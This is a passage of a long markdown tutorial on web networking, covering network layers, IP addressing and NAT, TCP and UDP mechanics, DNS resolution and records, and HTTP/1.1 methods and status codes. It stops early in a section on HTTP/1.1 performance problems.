# Web Networking Mastery — From Zero to Production Expert

> A senior architect's complete guide. No assumptions. Every concept earned.
> Built for engineers who want to debug anything, design anything, and explain anything in web networking.

---

## Table of Contents

1. [Chapter 1: Foundations — How Machines Talk](#chapter-1-foundations--how-machines-talk)
2. [Chapter 2: IP — The Address System of the Internet](#chapter-2-ip--the-address-system-of-the-internet)
3. [Chapter 3: TCP — Reliable Delivery, Deeply Understood](#chapter-3-tcp--reliable-delivery-deeply-understood)
4. [Chapter 4: UDP — When Speed Beats Reliability](#chapter-4-udp--when-speed-beats-reliability)
5. [Chapter 5: DNS — The Internet's Phone Book](#chapter-5-dns--the-internets-phone-book)
6. [Chapter 6: HTTP/1.1 — The Foundation Protocol](#chapter-6-http11--the-foundation-protocol)
7. [Chapter 7: HTTP/2 — Multiplexed and Binary](#chapter-7-http2--multiplexed-and-binary)
8. [Chapter 8: HTTP/3 and QUIC — The Future](#chapter-8-http3-and-quic--the-future)
9. [Chapter 9: TLS/HTTPS — Security In Depth](#chapter-9-tlshttps--security-in-depth)
10. [Chapter 10: WebSockets — Full-Duplex Communication](#chapter-10-websockets--full-duplex-communication)
11. [Chapter 11: Server-Sent Events (SSE)](#chapter-11-server-sent-events-sse)
12. [Chapter 12: WebRTC — Peer-to-Peer in the Browser](#chapter-12-webrtc--peer-to-peer-in-the-browser)
13. [Chapter 13: gRPC — High-Performance RPC](#chapter-13-grpc--high-performance-rpc)
14. [Chapter 14: Caching — The Performance Multiplier](#chapter-14-caching--the-performance-multiplier)
15. [Chapter 15: CORS — Cross-Origin Resource Sharing](#chapter-15-cors--cross-origin-resource-sharing)
16. [Chapter 16: Cookies, Sessions, and Authentication](#chapter-16-cookies-sessions-and-authentication)
17. [Chapter 17: CDNs — Content Delivery Networks](#chapter-17-cdns--content-delivery-networks)
18. [Chapter 18: Load Balancers and Proxies](#chapter-18-load-balancers-and-proxies)
19. [Chapter 19: Service Mesh and Modern Infrastructure](#chapter-19-service-mesh-and-modern-infrastructure)
20. [Chapter 20: Network Security — Attacks and Defenses](#chapter-20-network-security--attacks-and-defenses)
21. [Chapter 21: Observability and Debugging](#chapter-21-observability-and-debugging)
22. [Chapter 22: The Complete Request Lifecycle](#chapter-22-the-complete-request-lifecycle)
23. [Chapter 23: Hands-On Exercises](#chapter-23-hands-on-exercises)
24. [Chapter 24: Interview-Ready Cheat Sheet](#chapter-24-interview-ready-cheat-sheet)

---

## Chapter 1: Foundations — How Machines Talk

### 1.1 What Is a Network?

A **network** is two or more devices capable of exchanging data. Nothing more.

- Two laptops connected by an Ethernet cable → network
- Your phone connected to your home Wi-Fi router → network
- Billions of devices interconnected globally → **the internet**

The internet is not one network. It is a **network of networks** — ISPs, data centers, undersea cables, satellites — all agreeing on common protocols to exchange data.

### 1.2 What Is a Protocol?

A protocol is a **set of rules** that defines how data is formatted, transmitted, received, and acknowledged.

Analogy: Two people on walkie-talkies agree to:
- Speak English (format)
- Say "over" when done speaking (flow control)
- Say "say again" if they didn't hear (error recovery)
- Say "out" to end the conversation (termination)

Without agreed-upon protocols, communication is chaos.

### 1.3 The OSI Model — The Mental Framework

The **Open Systems Interconnection (OSI)** model divides networking into 7 layers. Each layer has one job, and each layer only talks to the layer directly above and below it.

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 7 — Application                                       │
│ What you interact with: HTTP, HTTPS, FTP, SMTP, DNS        │
│ "I want the homepage of google.com"                         │
├─────────────────────────────────────────────────────────────┤
│ Layer 6 — Presentation                                      │
│ Data formatting: encryption (TLS), compression, encoding    │
│ "Encrypt this data before sending"                          │
├─────────────────────────────────────────────────────────────┤
│ Layer 5 — Session                                           │
│ Session management: establish, maintain, terminate           │
│ "Keep this connection alive for 30 seconds"                 │
├─────────────────────────────────────────────────────────────┤
│ Layer 4 — Transport                                         │
│ Port-to-port delivery: TCP (reliable), UDP (fast)           │
│ "Deliver this to port 443 on the destination"               │
├─────────────────────────────────────────────────────────────┤
│ Layer 3 — Network                                           │
│ Device-to-device across networks: IP addressing, routing    │
│ "Route this packet from 192.168.1.10 to 142.250.80.46"     │
├─────────────────────────────────────────────────────────────┤
│ Layer 2 — Data Link                                         │
│ Device-to-device on same network: MAC addresses, frames     │
│ "Send this frame to MAC AA:BB:CC:DD:EE:FF"                 │
├─────────────────────────────────────────────────────────────┤
│ Layer 1 — Physical                                          │
│ Raw bits: electrical signals, light pulses, radio waves     │
│ "Transmit 10110011 as voltage changes on this copper wire"  │
└─────────────────────────────────────────────────────────────┘
```

**Why layers matter:**
- **Separation of concerns**: Each layer solves one problem
- **Interchangeability**: Swap Wi-Fi for Ethernet (Layer 1) without changing HTTP (Layer 7)
- **Debugging**: Identify which layer is broken

### 1.4 The TCP/IP Model — What We Actually Use

The OSI model is a teaching tool. The real internet uses the **TCP/IP model** (4 layers):

```
┌──────────────────────────────────────────┐
│ Application Layer                        │
│ (OSI Layers 5, 6, 7 combined)           │
│ HTTP, DNS, TLS, FTP, SMTP, WebSocket    │
├──────────────────────────────────────────┤
│ Transport Layer                          │
│ (OSI Layer 4)                           │
│ TCP, UDP                                │
├──────────────────────────────────────────┤
│ Internet Layer                           │
│ (OSI Layer 3)                           │
│ IP (v4/v6), ICMP, ARP                   │
├──────────────────────────────────────────┤
│ Network Access Layer                     │
│ (OSI Layers 1, 2 combined)             │
│ Ethernet, Wi-Fi, Bluetooth              │
└──────────────────────────────────────────┘
```

### 1.5 Encapsulation — How Data Travels Down the Stack

When you send data, each layer wraps it with its own header:

```
Application:  [HTTP Data                                           ]
Transport:    [TCP Header][HTTP Data                               ]
Internet:     [IP Header ][TCP Header][HTTP Data                   ]
Network:      [ETH Header][IP Header ][TCP Header][HTTP Data][ETH Trailer]
```

At each layer, the data from the layer above becomes the **payload** for the current layer.

The receiver does the reverse — **de-encapsulation** — stripping headers from bottom to top.

### 1.6 Packets, Segments, Frames — Terminology

| Layer | Data Unit Name | Key Identifier |
|-------|---------------|----------------|
| Application | Message / Data | — |
| Transport | Segment (TCP) / Datagram (UDP) | Port number |
| Internet | Packet | IP address |
| Network Access | Frame | MAC address |

Using the correct term tells other engineers exactly which layer you're discussing.

---

## Chapter 2: IP — The Address System of the Internet

### 2.1 What Is an IP Address?

Every device on a network needs a unique identifier — an **IP address**. It serves two purposes:
1. **Identification**: Which device is this?
2. **Location**: Where is this device on the network?

### 2.2 IPv4

Format: `192.168.1.10` — four octets (8-bit numbers), separated by dots.

Each octet ranges from 0 to 255. Total address space: 2^32 = **4,294,967,296 addresses**.

This is not enough. We've run out. This is why IPv6 exists.

### 2.3 IPv6

Format: `2001:0db8:85a3:0000:0000:8a2e:0370:7334` — eight groups of four hex digits.

Total address space: 2^128 = **340 undecillion addresses** (enough for every atom on Earth's surface).

Shortening rules:
- Drop leading zeros: `2001:db8:85a3:0:0:8a2e:370:7334`
- Replace consecutive zero groups with `::` (once): `2001:db8:85a3::8a2e:370:7334`

### 2.4 Public vs Private IP Addresses

**Private IP ranges** (RFC 1918) — used inside local networks, not routable on the internet:

| Range | CIDR | Addresses |
|-------|------|-----------|
| `10.0.0.0` – `10.255.255.255` | `10.0.0.0/8` | 16,777,216 |
| `172.16.0.0` – `172.31.255.255` | `172.16.0.0/12` | 1,048,576 |
| `192.168.0.0` – `192.168.255.255` | `192.168.0.0/16` | 65,536 |

**Public IP addresses** are globally unique, assigned by your ISP, and routable on the internet.

Special addresses:
- `127.0.0.1` — **Loopback** (localhost). Never leaves your machine.
- `0.0.0.0` — "All interfaces" or "any address" (context-dependent).
- `255.255.255.255` — Broadcast address.

### 2.5 NAT — Network Address Translation

**Problem**: You have 50 devices at home. Your ISP gives you ONE public IP.

**Solution**: Your router performs NAT.

```
Your Laptop (192.168.1.10:54321) ──┐
                                    ├── Router (NAT) ── Public IP (203.0.113.1) ── Internet
Your Phone  (192.168.1.11:54322) ──┘
```

NAT maintains a **translation table**:

| Internal | External | Destination |
|----------|----------|-------------|
| 192.168.1.10:54321 | 203.0.113.1:40001 | 142.250.80.46:443 |
| 192.168.1.11:54322 | 203.0.113.1:40002 | 142.250.80.46:443 |

When a response comes back to `203.0.113.1:40001`, the router knows to forward it to `192.168.1.10:54321`.

**Types of NAT:**
- **SNAT (Source NAT)**: Rewrites source address (outbound traffic)
- **DNAT (Destination NAT)**: Rewrites destination address (inbound traffic / port forwarding)
- **PAT (Port Address Translation)**: Maps multiple internal IPs to one external IP using different ports (most common)

### 2.6 Subnets and CIDR Notation

A **subnet** divides a network into smaller networks.

**CIDR (Classless Inter-Domain Routing)** notation: `192.168.1.0/24`

The `/24` means the first 24 bits are the **network portion**. The remaining 8 bits are the **host portion**.

```
IP:   192.168.1.100
Mask: 255.255.255.0    (/24)

Binary:
IP:   11000000.10101000.00000001.01100100
Mask: 11111111.11111111.11111111.00000000
      ├─── Network (24 bits) ──┤├ Host ┤

Network: 192.168.1.0
Host range: 192.168.1.1 – 192.168.1.254  (254 usable)
Broadcast: 192.168.1.255
```

Common subnets:

| CIDR | Subnet Mask | Usable Hosts | Use Case |
|------|-------------|-------------|----------|
| /32 | 255.255.255.255 | 1 | Single host |
| /24 | 255.255.255.0 | 254 | Small office |
| /16 | 255.255.0.0 | 65,534 | Large campus |
| /8 | 255.0.0.0 | 16,777,214 | Enterprise |

### 2.7 Routing — How Packets Find Their Way

When your computer sends a packet to `142.250.80.46`:

1. **Is it local?** Compare destination IP with my subnet. If same subnet → send directly via Layer 2 (ARP → MAC → frame).
2. **If not local** → Send to my **default gateway** (router).
3. **Router checks its routing table** → Which next-hop router is closer to the destination?
4. This repeats **hop by hop** until the packet reaches the destination network.

Each router along the path only needs to know the **next hop**, not the full path. This is how the internet scales.

**Key protocols:**
- **BGP (Border Gateway Protocol)**: How ISPs share routing information between autonomous systems. THE protocol that holds the internet together.
- **OSPF / IS-IS**: Interior routing within an organization's network.

### 2.8 ARP — Address Resolution Protocol

**Problem**: You know the destination IP (`192.168.1.1`), but Ethernet needs a **MAC address** to deliver the frame.

**Solution**: ARP

```
Your Machine (broadcast): "Who has 192.168.1.1? Tell 192.168.1.10"
Router:                    "192.168.1.1 is at MAC AA:BB:CC:DD:EE:FF"
Your Machine:              (saves in ARP cache, sends frame to that MAC)
```

View your ARP cache: `arp -a`

### 2.9 ICMP — Internet Control Message Protocol

ICMP carries **diagnostic and error messages**:

- `ping` → ICMP Echo Request / Echo Reply (is the host alive?)
- `traceroute` → ICMP Time Exceeded messages (trace the path)
- "Destination Unreachable" → ICMP Type 3 (something is broken)

ICMP is at Layer 3 (Network layer). It doesn't use ports.

---

## Chapter 3: TCP — Reliable Delivery, Deeply Understood

### 3.1 Why TCP Exists

IP provides **best-effort delivery**. Packets can be:
- **Lost** (router dropped it due to congestion)
- **Duplicated** (retransmitted when not needed)
- **Reordered** (took different paths)
- **Corrupted** (bit flip during transmission)

TCP sits on top of IP and provides: **reliable, ordered, error-checked, flow-controlled** byte stream delivery.

### 3.2 TCP Header — What's In Every Segment

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│          Source Port          │       Destination Port        │
├───────────────────────────────┼───────────────────────────────┤
│                    Sequence Number                            │
├──────────────────────────────────────────────────────────────┤
│                 Acknowledgment Number                         │
├───────┼───────┼─┼─┼─┼─┼─┼─┼─┼───────────────────────────────┤
│ Data  │       │U│A│P│R│S│F│  │                               │
│Offset │ Rsrvd │R│C│S│S│Y│I│  │         Window Size           │
│       │       │G│K│H│T│N│N│  │                               │
├───────┴───────┴─┴─┴─┴─┴─┴─┴──┼───────────────────────────────┤
│          Checksum             │       Urgent Pointer          │
├───────────────────────────────┼───────────────────────────────┤
│                    Options (variable)                         │
├──────────────────────────────────────────────────────────────┤
│                    Payload (data)                             │
└──────────────────────────────────────────────────────────────┘
```

Key fields:
- **Source/Destination Port**: 16 bits each (0–65535)
- **Sequence Number**: Position of the first byte in this segment within the stream
- **Acknowledgment Number**: Next byte the sender expects to receive
- **Flags**: SYN, ACK, FIN, RST, PSH, URG
- **Window Size**: How much data the receiver can accept (flow control)
- **Checksum**: Integrity verification

### 3.3 The Three-Way Handshake — Connection Establishment

```
    Client                              Server
      │                                   │
      │──── SYN (seq=100) ──────────────→│   "I want to connect"
      │                                   │
      │←─── SYN-ACK (seq=300, ack=101) ──│   "OK, I also want to connect"
      │                                   │
      │──── ACK (seq=101, ack=301) ─────→│   "Great, we're connected"
      │                                   │
      │   ═══ Connection Established ═══  │
```

**Why three steps?**
- Step 1: Client proves it can send
- Step 2: Server proves it can send AND receive
- Step 3: Client proves it can receive

Both sides agree on **initial sequence numbers (ISN)** — randomized to prevent sequence prediction attacks.

**SYN Flood Attack**: Attacker sends thousands of SYN packets with spoofed source IPs. Server allocates memory for each half-open connection. Server runs out of memory. Defense: **SYN cookies** — server encodes state in the SYN-ACK's sequence number, allocating no memory until the final ACK arrives.

### 3.4 Data Transfer — Sequence Numbers and Acknowledgments

```
    Client                              Server
      │                                   │
      │── Data (seq=101, 500 bytes) ───→ │
      │                                   │
      │←── ACK (ack=601) ────────────── │   "I got bytes up to 601, send next"
      │                                   │
      │── Data (seq=601, 500 bytes) ───→ │
      │                                   │
      │←── ACK (ack=1101) ──────────── │
```

**Cumulative acknowledgment**: `ack=601` means "I have received all bytes up to 600. Send byte 601 next."

### 3.5 Retransmission — Handling Lost Packets

If the sender doesn't receive an ACK within the **Retransmission Timeout (RTO)**, it resends.

**How RTO is calculated:**
```
SRTT = (1 - α) × SRTT + α × RTT_sample      (α typically 1/8)
RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|  (β typically 1/4)
RTO = SRTT + 4 × RTTVAR
```

**Fast Retransmit**: If the sender receives **3 duplicate ACKs** for the same sequence number, it retransmits immediately — without waiting for the timeout.

```
    Client                              Server
      │── Seg 1 (seq=1) ──────────────→ │ ✓ Received
      │── Seg 2 (seq=501) ─────── X     │ ✗ LOST
      │── Seg 3 (seq=1001) ───────────→ │ "I have 1, got 1001, but where's 501?"
      │←── ACK (ack=501) ──────────── │  Dup ACK #1
      │── Seg 4 (seq=1501) ───────────→ │
      │←── ACK (ack=501) ──────────── │  Dup ACK #2
      │── Seg 5 (seq=2001) ───────────→ │
      │←── ACK (ack=501) ──────────── │  Dup ACK #3 → FAST RETRANSMIT!
      │                                   │
      │── Seg 2 (seq=501) RETRANSMIT ──→ │ ✓
      │←── ACK (ack=2501) ──────────── │  Cumulative ACK for everything
```

### 3.6 Flow Control — Sliding Window

**Problem**: Sender is fast, receiver is slow. Receiver's buffer overflows.

**Solution**: The receiver advertises a **window size** in every ACK — the amount of buffer space available.

```
Receiver window = 4KB

Sender: "I can send up to 4KB before I need an ACK"

[    Sent & ACKed    |  Sent, not ACKed  |  Can send  |  Cannot send yet  ]
                     │←── Window (4KB) ──→│
```

When the receiver processes data, it opens the window. When it falls behind, it shrinks the window. If window = 0, sender stops (**zero window probe** keeps the connection alive).

**Window Scaling** (RFC 7323): The window size field is 16 bits (max 65,535). Window scaling option multiplies it by 2^n, allowing windows up to 1 GB. Negotiated during the handshake.

### 3.7 Congestion Control — Don't Crash the Network

Flow control protects the **receiver**. Congestion control protects the **network**.

The sender maintains a **congestion window (cwnd)** — separate from the receiver's window. The effective window is `min(cwnd, rwnd)`.

#### Phase 1: Slow Start

```
cwnd starts at 1 MSS (Maximum Segment Size, typically 1460 bytes)
For each ACK received: cwnd += 1 MSS

Round 1: cwnd = 1  → send 1 segment  → 1 ACK  → cwnd = 2
Round 2: cwnd = 2  → send 2 segments → 2 ACKs → cwnd = 4
Round 3: cwnd = 4  → send 4 segments → 4 ACKs → cwnd = 8
```

Exponential growth. Doubles every RTT. Fast, but dangerous.

#### Phase 2: Congestion Avoidance

When `cwnd` reaches the **slow start threshold (ssthresh)**, switch to linear growth:

```
For each RTT: cwnd += 1 MSS
```

#### On Packet Loss (Timeout):

```
ssthresh = cwnd / 2
cwnd = 1 MSS
Start slow start again
```

#### On Packet Loss (3 Duplicate ACKs — Fast Recovery):

```
ssthresh = cwnd / 2
cwnd = ssthresh + 3 MSS
Continue congestion avoidance (skip slow start)
```

#### Modern Algorithms:

| Algorithm | Approach | Used By |
|-----------|----------|---------|
| **Reno** | Classic AIMD (Additive Increase, Multiplicative Decrease) | Legacy |
| **Cubic** | Cubic function for window growth. Default in Linux. | Most servers |
| **BBR** | Model-based. Measures bandwidth and RTT. Doesn't react to loss. | Google, YouTube |
| **BBR v2** | Fairness improvements over BBR v1 | Google (newer) |

**BBR** is revolutionary — it maintains high throughput even with moderate packet loss, unlike loss-based algorithms that halve their rate. It probes for maximum bandwidth and minimum RTT separately.

### 3.8 Connection Termination — Four-Way Handshake

```
    Client                              Server
      │                                   │
      │──── FIN (seq=500) ──────────────→│   "I'm done sending"
      │                                   │
      │←─── ACK (ack=501) ──────────────│   "OK, noted"
      │                                   │
      │     (Server may still send data)  │
      │                                   │
      │←─── FIN (seq=800) ──────────────│   "I'm also done sending"
      │                                   │
      │──── ACK (ack=801) ──────────────→│   "OK, connection closed"
      │                                   │
      │   TIME_WAIT (2×MSL) ────────────→│
```

**TIME_WAIT state**: The client waits for 2 × MSL (Maximum Segment Lifetime, typically 60 seconds) before fully closing. This ensures:
1. Late-arriving segments from this connection are discarded
2. The final ACK reaches the server (if lost, server retransmits FIN)

**Production impact**: Servers handling thousands of short-lived connections accumulate TIME_WAIT sockets. Solutions:
- `SO_REUSEADDR` socket option
- `tcp_tw_reuse` kernel parameter
- Connection pooling (reuse connections instead of creating new ones)

### 3.9 Nagle's Algorithm and Delayed ACKs

**Nagle's Algorithm**: Don't send small segments. Buffer data until:
- Previous data has been ACKed, OR
- Buffer fills up to MSS

This prevents "silly window syndrome" — sending 1-byte segments with 40 bytes of headers.

**Delayed ACKs**: Receiver waits up to 200ms to piggyback ACK on a data response.

**The interaction problem**: Nagle waits for ACK. Delayed ACK waits to piggyback. Both wait. 200ms delay. This is why many applications disable Nagle with `TCP_NODELAY`.

### 3.10 TCP Keep-Alive

If no data is sent for a long time, how do you know the connection is still alive?

**TCP Keep-Alive**: After `tcp_keepalive_time` (default 7200s = 2 hours), send an empty ACK. If no response after `tcp_keepalive_probes` (default 9) attempts spaced `tcp_keepalive_intvl` (default 75s) apart, declare the connection dead.

For web applications, **application-level heartbeats** (WebSocket ping/pong, HTTP/2 PING frames) are preferred because they're more configurable and work through proxies.

---

## Chapter 4: UDP — When Speed Beats Reliability

### 4.1 UDP Header

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│          Source Port          │       Destination Port        │
├───────────────────────────────┼───────────────────────────────┤
│            Length             │           Checksum            │
├───────────────────────────────┴───────────────────────────────┤
│                         Payload                              │
└──────────────────────────────────────────────────────────────┘
```

That's it. 8 bytes. Compare to TCP's minimum 20 bytes.

### 4.2 Properties

- **Connectionless**: No handshake. Just send.
- **Unreliable**: No acknowledgments. No retransmission.
- **Unordered**: Packets may arrive out of order.
- **No flow/congestion control**: Can blast data as fast as you want (the network may drop it).
- **Message-oriented**: Each `send()` = one datagram. Boundaries preserved.

### 4.3 When to Use UDP

| Use Case | Why UDP? |
|----------|----------|
| DNS queries | Single request-response. TCP handshake overhead > query time. |
| Video streaming | Losing a frame is better than buffering. |
| Online gaming | 200ms stale position data is worthless. Latest data only. |
| VoIP (Voice over IP) | Retransmitting old audio makes it worse. |
| IoT sensors | Lightweight devices. Low overhead. |
| QUIC (HTTP/3) | Builds reliability ON TOP of UDP at application layer. |

### 4.4 Building Reliability on UDP

Applications like QUIC, WebRTC, and game engines implement their own reliability layer on top of UDP:

- Sequence numbers for ordering
- Selective ACKs for retransmission
- Application-level congestion control

This gives them control over what gets retransmitted and how, unlike TCP's all-or-nothing approach.

---

## Chapter 5: DNS — The Internet's Phone Book

### 5.1 The Problem

Humans remember names: `google.com`. Computers need addresses: `142.250.80.46`. DNS bridges this gap.

### 5.2 DNS Hierarchy

```
                    . (Root)
                   /    |    \
               .com   .org   .net   .io   .dev   (TLDs)
              /    \
         google   amazon    (Second-level domains)
         /    \
       www   mail           (Subdomains)
```

### 5.3 The Full Resolution Process

When you type `www.google.com`:

```
Step 1: Browser DNS cache
        → "Have I resolved this recently?"
        → Miss

Step 2: OS DNS cache (stub resolver)
        → Check /etc/hosts file first
        → Check OS-level cache
        → Miss

Step 3: Query the configured recursive resolver
        (Usually your ISP's or a public one like 8.8.8.8 / 1.1.1.1)

Step 4: Recursive resolver checks its cache
        → Miss (or TTL expired)

Step 5: Recursive resolver queries a Root Name Server
        → "I don't know www.google.com, but here are the .com TLD servers"
        → Returns NS records for .com (e.g., a.gtld-servers.net)

Step 6: Recursive resolver queries the .com TLD server
        → "I don't know www.google.com, but here are Google's authoritative servers"
        → Returns NS records (e.g., ns1.google.com)

Step 7: Recursive resolver queries Google's authoritative DNS server
        → "www.google.com? That's 142.250.80.46"
        → Returns A record with TTL

Step 8: Recursive resolver caches the result (respecting TTL)
        → Returns to OS

Step 9: OS caches it, returns to browser

Step 10: Browser caches it, initiates TCP connection to 142.250.80.46
```

### 5.4 DNS Record Types — Complete Reference

| Record | Name | Purpose | Example |
|--------|------|---------|---------|
| **A** | Address | Domain → IPv4 | `google.com → 142.250.80.46` |
| **AAAA** | IPv6 Address | Domain → IPv6 | `google.com → 2607:f8b0:4004:...` |
| **CNAME** | Canonical Name | Alias → another domain | `www.example.com → example.com` |
| **MX** | Mail Exchange | Mail server for domain | `example.com → mail.example.com (priority 10)` |
| **NS** | Name Server | Authoritative DNS servers | `example.com → ns1.google.com` |
| **TXT** | Text | Arbitrary text data | SPF, DKIM, domain verification |
| **SOA** | Start of Authority | Zone metadata | Primary NS, admin email, serial |
| **SRV** | Service | Service location (port + host) | `_sip._tcp.example.com → sipserver.example.com:5060` |
| **PTR** | Pointer | Reverse DNS (IP → domain) | `46.80.250.142 → google.com` |
| **CAA** | Cert Authority Auth | Which CAs can issue certs | `example.com → letsencrypt.org` |

### 5.5 TTL — Time to Live

Every DNS record has a TTL (in seconds). After TTL expires, the cached record is stale and must be re-queried.

| TTL | Duration | Use Case |
|-----|----------|----------|
| 60 | 1 minute | During migrations / failover |
| 300 | 5 minutes | Frequently changing records |
| 3600 | 1 hour | Normal operations |
| 86400 | 1 day | Stable records |

**Strategy before migration**: Lower TTL days in advance → migrate → raise TTL back.

### 5.6 DNS Security

#### DNSSEC (DNS Security Extensions)
Adds cryptographic signatures to DNS responses. Verifies that the response came from the authoritative server and wasn't tampered with.

Chain of trust: Root → TLD → authoritative, each signing the next level's keys.

#### DNS over HTTPS (DoH)
DNS queries inside HTTPS requests (port 443). Looks like normal web traffic. Prevents ISP snooping on DNS queries.

#### DNS over TLS (DoT)
DNS queries encrypted with TLS (port 853). Easier for network admins to identify and manage than DoH.

#### DNS Attacks:

| Attack | How | Defense |
|--------|-----|---------|
| **DNS Spoofing/Poisoning** | Inject false records into cache | DNSSEC |
| **DNS Amplification DDoS** | Spoofed queries → large responses to victim | Rate limiting, BCP38 |
| **DNS Tunneling** | Encode data in DNS queries to exfiltrate | Monitor anomalous DNS patterns |
| **DNS Hijacking** | Compromise DNS server or resolver | DNSSEC, monitoring |

---

## Chapter 6: HTTP/1.1 — The Foundation Protocol

### 6.1 What Is HTTP?

**HyperText Transfer Protocol** — a text-based, stateless, request-response protocol for transferring hypermedia documents. Runs over TCP, typically on port 80 (HTTP) or 443 (HTTPS).

**Stateless**: Each request is independent. The server retains no memory of previous requests. (State is managed through cookies, sessions, tokens.)

### 6.2 HTTP Request — Complete Anatomy

```
POST /api/users HTTP/1.1                    ← Request line
Host: api.example.com                        ← Required in HTTP/1.1
Content-Type: application/json               ← Body format
Content-Length: 42                            ← Body size in bytes
Accept: application/json                     ← What response format you want
Authorization: Bearer eyJhbGciOiJI...        ← Authentication token
User-Agent: Mozilla/5.0 (Macintosh; ...)     ← Client identification
Accept-Encoding: gzip, deflate, br           ← Supported compression
Connection: keep-alive                       ← Reuse TCP connection
Cache-Control: no-cache                      ← Caching directive
Cookie: session=abc123                       ← Session cookie
X-Request-ID: uuid-here                      ← Custom header for tracing
                                             ← Blank line (separator)
{"name": "John", "email": "j@example.com"}  ← Body
```

### 6.3 HTTP Response — Complete Anatomy

```
HTTP/1.1 201 Created                         ← Status line
Content-Type: application/json               ← Response body format
Content-Length: 89                            ← Response body size
Location: /api/users/42                      ← URI of created resource
Cache-Control: no-store                      ← Don't cache this
Set-Cookie: session=xyz; HttpOnly; Secure    ← Set cookie
X-RateLimit-Remaining: 99                    ← Rate limit info
X-Request-ID: uuid-here                      ← Echo back trace ID
Date: Sat, 21 Mar 2026 10:00:00 GMT         ← Server timestamp
                                             ← Blank line
{"id": 42, "name": "John", "email": "j@example.com", "created": "2026-03-21"}
```

### 6.4 HTTP Methods — Full Semantics

#### GET — Retrieve a Resource
```
GET /api/users/42 HTTP/1.1
Host: api.example.com
Accept: application/json

→ 200 OK with user data
→ 304 Not Modified (if cached version is fresh)
→ 404 Not Found
```
- **Safe**: Yes (does not modify state)
- **Idempotent**: Yes (calling 10 times = same result)
- **Cacheable**: Yes
- **Body**: Should NOT have a request body

#### POST — Create a Resource (or Trigger an Action)
```
POST /api/users HTTP/1.1
Content-Type: application/json

{"name": "John"}

→ 201 Created + Location header
→ 409 Conflict (duplicate)
→ 422 Unprocessable Entity (validation failed)
```
- **Safe**: No
- **Idempotent**: No (calling twice may create two resources)
- **Cacheable**: Only if response includes explicit caching headers

#### PUT — Replace a Resource Entirely
```
PUT /api/users/42 HTTP/1.1
Content-Type: application/json

{"name": "John Updated", "email": "new@example.com"}

→ 200 OK (replaced)
→ 201 Created (if it didn't exist)
→ 204 No Content (replaced, no body)
```
- **Idempotent**: Yes (calling 10 times = same resource state)
- **Must send complete representation** (missing fields = deleted)

#### PATCH — Partial Update
```
PATCH /api/users/42 HTTP/1.1
Content-Type: application/merge-patch+json

{"email": "new@example.com"}

→ 200 OK (only email changed, name preserved)
```
- **Idempotent**: Not guaranteed (depends on implementation)
- **Sends only changed fields**

#### DELETE — Remove a Resource
```
DELETE /api/users/42 HTTP/1.1

→ 204 No Content (deleted)
→ 404 Not Found (already gone)
```
- **Idempotent**: Yes (deleting twice = same result: resource is gone)

#### HEAD — GET Without Body
```
HEAD /api/users/42 HTTP/1.1

→ 200 OK (same headers as GET, but no body)
```
Use case: Check if resource exists, get metadata, verify caching.

#### OPTIONS — What's Allowed?
```
OPTIONS /api/users HTTP/1.1

→ 200 OK
→ Allow: GET, POST, OPTIONS
→ Access-Control-Allow-Methods: GET, POST (CORS preflight)
```

### 6.5 Status Codes — Complete Guide

#### 1xx — Informational
| Code | Meaning | When Used |
|------|---------|-----------|
| 100 | Continue | Client sent `Expect: 100-continue`. Server says "go ahead, send the body." |
| 101 | Switching Protocols | Upgrading to WebSocket or HTTP/2 |
| 103 | Early Hints | Send `Link` headers early so browser can preload resources |

#### 2xx — Success
| Code | Meaning | When Used |
|------|---------|-----------|
| 200 | OK | Standard success. Body contains result. |
| 201 | Created | POST created a resource. Include `Location` header. |
| 202 | Accepted | Request accepted for async processing. Not done yet. |
| 204 | No Content | Success. No body. Common for DELETE, PUT. |
| 206 | Partial Content | Range request fulfilled. Used for video streaming, resumable downloads. |

#### 3xx — Redirection
| Code | Meaning | When Used |
|------|---------|-----------|
| 301 | Moved Permanently | URL permanently changed. Browsers cache this. Search engines update. |
| 302 | Found (Temporary) | Temporary redirect. Browser should keep using original URL. |
| 303 | See Other | After POST, redirect to GET the result. (PRG pattern) |
| 304 | Not Modified | Conditional request. Cached version is still valid. No body sent. |
| 307 | Temporary Redirect | Like 302, but MUST preserve HTTP method (POST stays POST) |
| 308 | Permanent Redirect | Like 301, but MUST preserve HTTP method |

**301 vs 308**: 301 allows browser to change POST to GET. 308 does not.
**302 vs 307**: Same distinction. 307 preserves the method.

#### 4xx — Client Error
| Code | Meaning | When Used |
|------|---------|-----------|
| 400 | Bad Request | Malformed syntax, invalid parameters |
| 401 | Unauthorized | Authentication required. Include `WWW-Authenticate` header. |
| 403 | Forbidden | Authenticated but not authorized for this resource. |
| 404 | Not Found | Resource doesn't exist. |
| 405 | Method Not Allowed | POST on a read-only endpoint. Include `Allow` header. |
| 408 | Request Timeout | Client took too long to send the request. |
| 409 | Conflict | Conflicting state (duplicate creation, edit conflict). |
| 413 | Payload Too Large | Request body exceeds server limit. |
| 415 | Unsupported Media Type | Sent XML, server only accepts JSON. |
| 422 | Unprocessable Entity | Syntax is valid but semantics are wrong (validation error). |
| 429 | Too Many Requests | Rate limited. Include `Retry-After` header. |
| 451 | Unavailable For Legal Reasons | Censored. |

**401 vs 403**: 401 = "Who are you?" 403 = "I know who you are, and you can't do this."

#### 5xx — Server Error
| Code | Meaning | When Used |
|------|---------|-----------|
| 500 | Internal Server Error | Unhandled exception. Generic server failure. |
| 502 | Bad Gateway | Reverse proxy/LB got invalid response from upstream. |
| 503 | Service Unavailable | Server overloaded or in maintenance. Include `Retry-After`. |
| 504 | Gateway Timeout | Reverse proxy/LB didn't get a timely response from upstream. |

### 6.6 HTTP/1.1 Performance Problems

1. **Head-of-Line Blocking**: One slow response blocks all subsequent requests on the same connection.

